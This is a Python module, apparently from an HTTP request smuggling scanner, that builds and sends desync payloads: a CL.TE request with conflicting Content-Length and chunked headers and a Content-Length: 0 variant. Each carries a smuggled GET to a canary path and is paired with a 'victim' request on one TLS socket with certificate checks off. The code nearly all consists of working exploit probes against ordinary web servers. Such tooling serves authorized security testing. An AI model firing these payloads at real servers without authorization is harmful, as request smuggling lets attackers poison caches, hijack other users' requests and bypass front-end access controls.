"""Single-packet attack with pipelining-aware desync confirmation."""

from socket import (create_connection, socket, IPPROTO_TCP, TCP_NODELAY,
                    timeout as SocketTimeout)
from ssl import CERT_NONE, create_default_context
from typing import Dict, List

from lib.canary import CanaryGenerator

try:
    from socket import TCP_CORK
    _HAS_CORK = True
except ImportError:
    _HAS_CORK = False


DRAIN_TIMEOUT = 0.8
MAX_RESPONSES = 6


def _split_responses(blob: bytes) -> List[bytes]:
    responses = []
    remaining = blob
    while remaining and len(responses) < MAX_RESPONSES:
        idx = remaining.find(b"\r\n\r\n")
        if idx < 0:
            responses.append(remaining)
            break
        head = remaining[:idx]
        body_need = 0
        chunked = False
        for line in head.split(b"\r\n"):
            lower = line.lower()
            if lower.startswith(b"content-length:"):
                try:
                    body_need = int(line.split(b":", 1)[1].strip())
                except ValueError:
                    body_need = 0
            elif lower.startswith(b"transfer-encoding:") and b"chunked" in lower:
                chunked = True
        if chunked:
            end = idx + 4
            while end < len(remaining):
                term = remaining.find(b"\r\n", end)
                if term < 0:
                    end = len(remaining)
                    break
                try:
                    size = int(remaining[end:term].split(b";", 1)[0].strip(), 16)
                except ValueError:
                    end = len(remaining)
                    break
                end = term + 2 + size + 2
                if size == 0:
                    end += 2
                    break
            responses.append(remaining[:end])
            remaining = remaining[end:]
        else:
            end = idx + 4 + body_need
            responses.append(remaining[:end])
            remaining = remaining[end:]
    return responses


class SinglePacketAttack:
    def __init__(self, host: str, port: int, use_tls: bool, timeout: float) -> None:
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.canary = CanaryGenerator()

    def _connect(self) -> socket:
        sock = create_connection((self.host, self.port), self.timeout)
        sock.settimeout(self.timeout)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        if _HAS_CORK:
            try:
                sock.setsockopt(IPPROTO_TCP, TCP_CORK, 1)
            except OSError:
                pass
        if self.use_tls:
            ctx = create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _uncork(self, sock: socket) -> None:
        if _HAS_CORK:
            try:
                sock.setsockopt(IPPROTO_TCP, TCP_CORK, 0)
            except OSError:
                pass

    def _drain(self, sock: socket, window: float = DRAIN_TIMEOUT) -> bytes:
        saved = sock.gettimeout()
        sock.settimeout(window)
        data = b""
        try:
            while True:
                try:
                    chunk = sock.recv(65535)
                except SocketTimeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                data += chunk
        finally:
            try:
                sock.settimeout(saved)
            except OSError:
                pass
        return data

    def send_pair(self, req_a: bytes, req_b: bytes) -> Dict[str, object]:
        combined = req_a + req_b
        blob = b""
        try:
            sock = self._connect()
            sock.sendall(combined)
            self._uncork(sock)
            blob = self._drain(sock)
            sock.close()
        except OSError:
            pass
        responses = _split_responses(blob) if blob else []
        return {"response_count": len(responses), "responses": responses, "raw": blob}

    @staticmethod
    def _parse_status(response: bytes) -> int:
        first = response.split(b"\r\n", 1)[0]
        parts = first.split(b" ", 2)
        if len(parts) < 2:
            return -1
        try:
            return int(parts[1])
        except ValueError:
            return -1

    @staticmethod
    def _classify(responses: List[bytes], canary_path: str,
                  canary: CanaryGenerator) -> Dict[str, object]:
        if not responses:
            return {"canary_hit": False, "desync_suspected": False,
                    "pipelines": 0, "response_count": 0}
        flags = [canary.validate(r, canary_path) for r in responses]
        pipelines = sum(1 for f in flags[:-1] if f)
        victim_hit = bool(flags[-1]) if flags else False
        statuses = [SinglePacketAttack._parse_status(r) for r in responses]
        victim_status = statuses[-1] if statuses else -1
        victim_is_error = 400 <= victim_status < 600
        desync = (
            victim_hit
            and pipelines == 0
            and len(responses) == 2
            and victim_status > 0
            and not victim_is_error
        )
        return {
            "canary_hit": victim_hit,
            "desync_suspected": desync,
            "pipelines": pipelines,
            "response_count": len(responses),
            "statuses": statuses,
        }

    def probe_pipeline_desync(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        req_a = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n\r\n{smuggled}"
        ).encode("latin-1", errors="replace")
        req_b = (
            f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        ).encode("latin-1")
        result = self.send_pair(req_a, req_b)
        verdict = self._classify(result["responses"], canary_path, self.canary)
        result.update(verdict)
        result["type"] = "SINGLE_PACKET"
        result["canary_path"] = canary_path
        result["raw"] = req_a
        return result

    def probe_cl0_pair(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        req_a = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode("latin-1", errors="replace")
        req_b = (
            f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        ).encode("latin-1")
        result = self.send_pair(req_a, req_b)
        verdict = self._classify(result["responses"], canary_path, self.canary)
        result.update(verdict)
        result["type"] = "SINGLE_PACKET_CL0"
        result["canary_path"] = canary_path
        result["raw"] = req_a
        return result

    def run_all(self, endpoint: str, host_header: str) -> List[Dict[str, object]]:
        results = []
        for fn in (self.probe_pipeline_desync, self.probe_cl0_pair):
            try:
                results.append(fn(endpoint, host_header))
            except OSError:
                results.append({"type": fn.__name__, "error": "connection_failed",
                                "desync_suspected": False})
        return results